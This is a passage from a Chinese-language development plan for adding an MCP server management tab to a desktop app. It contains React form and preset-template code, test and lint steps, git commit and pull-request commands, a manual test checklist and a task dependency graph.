              <option value="websocket">{t('page.mcp.transport.websocket')}</option>
            </select>
          </FormField>

          {draft.transport === 'stdio' ? (
            <>
              <FormField label={t('page.mcp.field.command')} error={errors.command} required>
                <input
                  type="text"
                  value={draft.command}
                  onChange={(e) => update({ command: e.target.value })}
                  placeholder="npx"
                  className="w-full px-2 py-1 border rounded font-mono dark:bg-gray-700 dark:border-gray-600"
                />
              </FormField>
              <FormField label={t('page.mcp.field.args')} hint="空格或换行分隔">
                <textarea
                  value={draft.args}
                  onChange={(e) => update({ args: e.target.value })}
                  placeholder={'-y\n@modelcontextprotocol/server-filesystem'}
                  rows={2}
                  className="w-full px-2 py-1 border rounded font-mono text-sm dark:bg-gray-700 dark:border-gray-600"
                />
              </FormField>
              <FormField label={t('page.mcp.field.env')} hint="KEY=VALUE 每行一个">
                <textarea
                  value={draft.env}
                  onChange={(e) => update({ env: e.target.value })}
                  placeholder={'USER_DOCS=${env.USERPROFILE}/Documents'}
                  rows={2}
                  className="w-full px-2 py-1 border rounded font-mono text-sm dark:bg-gray-700 dark:border-gray-600"
                />
              </FormField>
            </>
          ) : (
            <>
              <FormField label={t('page.mcp.field.url')} error={errors.url} required>
                <input
                  type="text"
                  value={draft.url}
                  onChange={(e) => update({ url: e.target.value })}
                  placeholder="https://example.com/sse"
                  className="w-full px-2 py-1 border rounded font-mono dark:bg-gray-700 dark:border-gray-600"
                />
              </FormField>
              <FormField label={t('page.mcp.field.headers')} hint="KEY: VALUE 每行一个">
                <textarea
                  value={draft.headers}
                  onChange={(e) => update({ headers: e.target.value })}
                  placeholder={'Authorization: Bearer xxx'}
                  rows={2}
                  className="w-full px-2 py-1 border rounded font-mono text-sm dark:bg-gray-700 dark:border-gray-600"
                />
              </FormField>
            </>
          )}

          <label className="flex items-center gap-2 text-sm text-gray-700 dark:text-gray-300">
            <input
              type="checkbox"
              checked={draft.enabled}
              onChange={(e) => update({ enabled: e.target.checked })}
            />
            {t('page.mcp.field.enabled')}
          </label>
        </div>

        <div className="flex justify-end gap-2 mt-6">
          <button
            type="button"
            onClick={onCancel}
            className="px-4 py-1.5 text-sm rounded border border-gray-300 dark:border-gray-600 hover:bg-gray-100 dark:hover:bg-gray-700"
          >
            {t('common.cancel')}
          </button>
          <button
            type="submit"
            className="px-4 py-1.5 text-sm rounded bg-blue-500 text-white hover:bg-blue-600"
          >
            {t('common.confirm')}
          </button>
        </div>
      </form>
    </div>
  )
}

function FormField({
  label,
  error,
  required,
  hint,
  children,
}: {
  label: string
  error?: string
  required?: boolean
  hint?: string
  children: React.ReactNode
}) {
  return (
    <div>
      <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
        {label}
        {required && <span className="text-red-500 ml-0.5">*</span>}
      </label>
      {children}
      {hint && <p className="mt-0.5 text-xs text-gray-400">{hint}</p>}
      {error && <p className="mt-0.5 text-xs text-red-500">{error}</p>}
    </div>
  )
}

/** 把多行字符串解析为 args 数组(每行一个 arg,或空格分隔) */
function parseArgs(input?: string): string[] {
  if (!input || !input.trim()) return []
  return input
    .split(/\n/)
    .map((l) => l.trim())
    .filter((l) => l.length > 0)
    .flatMap((l) => (l.includes(' ') && !l.startsWith('"') ? l.split(/\s+/) : [l]))
}

/** 把 KEY=VALUE 或 KEY: VALUE 多行解析为对象 */
function parseKv(input?: string): Record<string, string> | undefined {
  if (!input || !input.trim()) return undefined
  const result: Record<string, string> = {}
  for (const line of input.split(/\n/)) {
    const trimmed = line.trim()
    if (!trimmed) continue
    const idx = trimmed.indexOf(trimmed.includes('=') ? '=' : ':')
    if (idx < 0) continue
    const key = trimmed.slice(0, idx).trim()
    const value = trimmed.slice(idx + 1).trim()
    if (key) result[key] = value
  }
  return Object.keys(result).length > 0 ? result : undefined
}
```

- [ ] **Step 6: 类型检查**

Run: `npx tsc --noEmit`
Expected: 无新增错误（`parseArgs`/`parseKv` 的类型应能推断通过）

- [ ] **Step 7: Commit**

```bash
git add src/renderer/pages/Skills/components/McpServerForm.tsx src/renderer/pages/Skills/mcp-validate.ts tests/renderer/lib/mcp-validate.test.ts
git commit -m "feat(mcp): McpServerForm 表单 + validateMcpConfig 纯函数 + 单测"
```

---

## Task 10: PresetTemplates 预设模板

**Files:**
- Create: `src/renderer/pages/Skills/mcp-presets.ts`
- Create: `src/renderer/pages/Skills/components/PresetTemplates.tsx`

- [ ] **Step 1: 创建预设模板常量**

新建 `src/renderer/pages/Skills/mcp-presets.ts`：

```ts
import type { McpServerConfig } from '@shared/types'

/** 预设 MCP server 模板(种子数据,用户可任意修改) */
export interface McpPreset {
  /** i18n key 后缀,对应 page.mcp.preset.<suffix> */
  i18nSuffix: string
  config: McpServerConfig
}

export const MCP_PRESETS: McpPreset[] = [
  {
    i18nSuffix: 'filesystem',
    config: {
      id: 'filesystem',
      name: '本地文件系统',
      description: '让 Agent 读写本地文档目录',
      enabled: true,
      transport: 'stdio',
      command: 'npx',
      args: ['-y', '@modelcontextprotocol/server-filesystem', '${USER_DOCS}'],
      env: {
        USER_DOCS: '${env.USERPROFILE}/Documents',
      },
    },
  },
  {
    i18nSuffix: 'websearch',
    config: {
      id: 'web-search',
      name: '网页搜索',
      description: '让 Agent 搜索互联网(需要 API key)',
      enabled: true,
      transport: 'sse',
      url: 'https://mcpsearch.example.com/sse',
      headers: {
        Authorization: 'Bearer ${MCP_SEARCH_KEY}',
      },
    },
  },
  {
    i18nSuffix: 'sqlite',
    config: {
      id: 'sqlite',
      name: 'SQLite 数据库',
      description: '查询本地 SQLite 数据库',
      enabled: true,
      transport: 'stdio',
      command: 'uvx',
      args: ['mcp-server-sqlite', '--db-path', '${USER_DATA}/app.db'],
    },
  },
]
```

- [ ] **Step 2: 创建 PresetTemplates 组件**

新建 `src/renderer/pages/Skills/components/PresetTemplates.tsx`：

```tsx
import type { McpServerConfig } from '@shared/types'
import { useT } from '../../../i18n'
import { MCP_PRESETS } from '../mcp-presets'

interface PresetTemplatesProps {
  onSelect: (config: McpServerConfig) => void
  onCancel: () => void
}

export function PresetTemplates({ onSelect, onCancel }: PresetTemplatesProps) {
  const { t } = useT()

  return (
    <div
      className="fixed inset-0 bg-black/40 flex items-center justify-center z-50"
      onClick={onCancel}
    >
      <div
        onClick={(e) => e.stopPropagation()}
        className="bg-white dark:bg-gray-800 rounded-lg p-6 w-full max-w-md"
      >
        <h2 className="text-lg font-medium mb-4 text-gray-900 dark:text-gray-100">
          {t('page.mcp.preset.title')}
        </h2>
        <ul className="space-y-2">
          {MCP_PRESETS.map((preset) => {
            // 深拷贝 config 避免污染常量
            const config: McpServerConfig = JSON.parse(JSON.stringify(preset.config))
            return (
              <li key={preset.i18nSuffix}>
                <button
                  type="button"
                  onClick={() => onSelect(config)}
                  className="w-full text-left p-3 border border-gray-200 dark:border-gray-700 rounded hover:bg-gray-50 dark:hover:bg-gray-700/50"
                >
                  <div className="font-medium text-gray-900 dark:text-gray-100">
                    {t(`page.mcp.preset.${preset.i18nSuffix}`)}
                  </div>
                  <div className="text-xs text-gray-500 dark:text-gray-400 mt-0.5">
                    {config.description}
                  </div>
                  <div className="text-xs text-gray-400 mt-1 font-mono">
                    {config.transport === 'stdio'
                      ? `${config.command} ${(config.args || []).join(' ')}`
                      : config.url}
                  </div>
                </button>
              </li>
            )
          })}
        </ul>
        <div className="flex justify-end mt-4">
          <button
            type="button"
            onClick={onCancel}
            className="px-4 py-1.5 text-sm rounded border border-gray-300 dark:border-gray-600 hover:bg-gray-100 dark:hover:bg-gray-700"
          >
            {t('common.cancel')}
          </button>
        </div>
      </div>
    </div>
  )
}
```

- [ ] **Step 3: 类型检查**

Run: `npx tsc --noEmit`
Expected: 无新增错误

- [ ] **Step 4: Commit（含 Task 8 的 McpTab + McpServerCard）**

```bash
git add src/renderer/pages/Skills/tabs/McpTab.tsx src/renderer/pages/Skills/components/McpServerCard.tsx src/renderer/pages/Skills/components/PresetTemplates.tsx src/renderer/pages/Skills/mcp-presets.ts
git commit -m "feat(mcp): McpTab + McpServerCard + PresetTemplates 完整 MCP 管理 UI"
```

---

## Task 11: 端到端手测 + lint

**Files:** 无（纯验证 task）

> Task 8 的 McpTab 代码已经是完整正确的（含 presetDraft 状态），本 task 只做验证。

- [ ] **Step 1: 类型检查 + lint**

Run: `npx tsc --noEmit && npm run lint`
Expected: 无错误

- [ ] **Step 2: 端到端手测**

启动 dev：`npm run tauri:dev`（或在已有 dev 环境下）

测试清单（逐项勾选）：
- [ ] 点导航「技能」→ 看到三个 Tab
- [ ] 点「技能」Tab → 原技能列表正常
- [ ] 点「MCP 服务器」Tab → 看到服务器列表（可能为空）
- [ ] 点「+ 添加服务器」→ 弹表单
- [ ] 填一个 stdio server（id: test, name: 测试, command: npx）→ 提交 → 列表出现
- [ ] 点「⚡从模板添加」→ 选「本地文件系统」→ 表单预填 → 提交 → 列表出现 filesystem
- [ ] 选中一个 server → 右侧卡片显示详情
- [ ] 点「测试连接」（可能失败，取决于 npx 是否可用，应显示错误 toast）
- [ ] 点「编辑」→ 表单预填 → 改 name → 提交 → 列表更新
- [ ] 点「删除」→ 确认 → 列表移除
- [ ] 点「插件」Tab → 显示 EmptyState 占位
- [ ] Tab 切换后刷新页面，记忆上次选的 Tab

- [ ] **Step 3: 如有手测发现的问题,修复后 Commit**

```bash
git add -A
git commit -m "fix(mcp): 手测发现的问题修复"
```

（如果手测全部通过无需修改，跳过本步）

---

## Task 12: 全量测试 + 文档更新

**Files:**
- Modify: `TESTING.md`（更新文件索引和用例数）
- Modify: `MCP_INTEGRATION_PLAN.md`（标记 UI 落地完成）

- [ ] **Step 1: 跑全量测试**

Run: `npm test`
Expected: 所有测试通过（含新增的 mcp-service-crud / mcp-helpers / mcp-validate）

如有失败，逐个修复后重跑。

- [ ] **Step 2: 跑覆盖率（确认新增代码覆盖）**

Run: `npm run test:coverage`
Expected:
- `mcp-helpers.ts` 的 `validateCommandSafe` 覆盖 100%
- `mcp-service.ts` 新增方法覆盖 ≥ 70%（addServer/updateServer/removeServer 的主路径）
- `mcp-validate.ts` 覆盖 100%

- [ ] **Step 3: 更新 TESTING.md**

打开 `TESTING.md`，在文件索引表里追加（如果该文件有「文件索引」段）：

- `tests/main/mcp-service-crud.test.ts` — McpService 增删改 + 覆盖语义（约 10 用例）
- `tests/main/mcp-helpers.test.ts`（扩展）— validateCommandSafe（约 5 用例）
- `tests/renderer/lib/mcp-validate.test.ts` — 前端表单校验（约 9 用例）

同时更新顶部的「用例总数」数字（+约 24）。

- [ ] **Step 4: 更新 MCP_INTEGRATION_PLAN.md**

打开 `MCP_INTEGRATION_PLAN.md`，在文件顶部或合适位置加一段状态标记：

```markdown
## 状态(2026-07-17 更新)

✅ **MCP 管理 UI 已落地**：技能页面新增「MCP 服务器」Tab，支持服务器 CRUD、连接测试、工具浏览、预设模板。
- 配置存储：用户级 `mcp.user.yaml`（仿 `agents.user.yaml`），全局 `mcp.yaml` 保持只读
- 设计文档：`docs/superpowers/specs/2026-07-17-skills-mcp-hub-design.md`
- 实施计划：`docs/superpowers/plans/2026-07-17-skills-mcp-hub.md`
```

- [ ] **Step 5: Commit**

```bash
git add TESTING.md MCP_INTEGRATION_PLAN.md
git commit -m "docs: 更新测试索引 + MCP UI 落地状态"
```

---

## Task 13: 最终验收 + PR 准备

- [ ] **Step 1: 完整构建检查**

Run: `npm run build`
Expected: 构建成功（main + renderer 都构建通过）

- [ ] **Step 2: sidecar 构建（确认 IPC 链路完整）**

Run: `npm run build:sidecar`
Expected: 成功（新 IPC 会自动被 sidecar-entry.ts 复用）

- [ ] **Step 3: git status 确认无遗漏**

Run: `git status`
Expected: clean（所有改动已提交）

- [ ] **Step 4: 查看本次所有 commit**

Run: `git log --oneline main..HEAD`（如果在分支上）或 `git log --oneline -12`
Expected: 看到约 10-12 个清晰的 commit，从类型扩展到 UI 完整

- [ ] **Step 5: (可选) 推送 + 开 PR**

如果用户要求开 PR：

```bash
git push origin <branch>
gh pr create --title "feat: 技能页面升级为能力中心(技能+MCP+预留插件)" --body "$(cat <<'EOF'
## 改动

把现有 SkillsPage 升级成统一「能力中心」，新增 MCP 服务器管理 Tab。

### 后端
- McpService 新增 addServer/updateServer/removeServer + mcp.user.yaml 持久化
- 覆盖语义：全局 mcp.yaml 永不写入，用户改动复制覆盖到 mcp.user.yaml
- 新增 3 IPC：mcp:add / mcp:update / mcp:remove
- validateCommandSafe 防 shell 注入

### 前端
- SkillsPage 重构成 Tab 容器（技能 / MCP服务器 / 插件占位）
- McpTab：左右分栏，服务器列表 + 详情卡片 + 连接测试 + 工具浏览
- McpServerForm：新增/编辑表单 + 纯函数校验
- PresetTemplates：3 个预设模板一键添加

### 测试
- 新增约 24 用例，覆盖后端 CRUD + 覆盖语义 + 前端校验
- 现有测试全部通过

设计文档：docs/superpowers/specs/2026-07-17-skills-mcp-hub-design.md
EOF
)"
```

- [ ] **Step 6: 向用户报告完成**

汇总：
- 新增/改动文件数
- 新增测试用例数
- 手测覆盖的场景
- 已知限制（如 list 不返回完整 config，编辑时未知字段留空）

---

## 附录：依赖关系图

```
Task 1 (types)
  ↓
Task 2 (validateCommandSafe)
  ↓
Task 3 (loadConfig 合并)  ←─ 依赖 Task 1, 2
  ↓
Task 4 (CRUD 方法)  ←─ 依赖 Task 3
  ↓
Task 5 (IPC 全链路)  ←─ 依赖 Task 4
  ↓
Task 7 (i18n)  ←─ 独立,但 Task 8 依赖它
  ↓
Task 6 (Tab 容器)  ←─ 依赖 Task 7 (i18n key)
  ↓
Task 9 (Form + validate)  ←─ 依赖 Task 7
  ↓
Task 10 (PresetTemplates)  ←─ 依赖 Task 7
  ↓
Task 8 (McpTab + Card)  ←─ 依赖 Task 9, 10
  ↓
Task 11 (presetDraft 修正 + 手测)  ←─ 依赖 Task 8, 9, 10
  ↓
Task 12 (全测 + 文档)
  ↓
Task 13 (验收 + PR)
```

可并行的：Task 2 与 Task 7（互相独立）；Task 9 与 Task 10（都依赖 Task 7，互不依赖）。
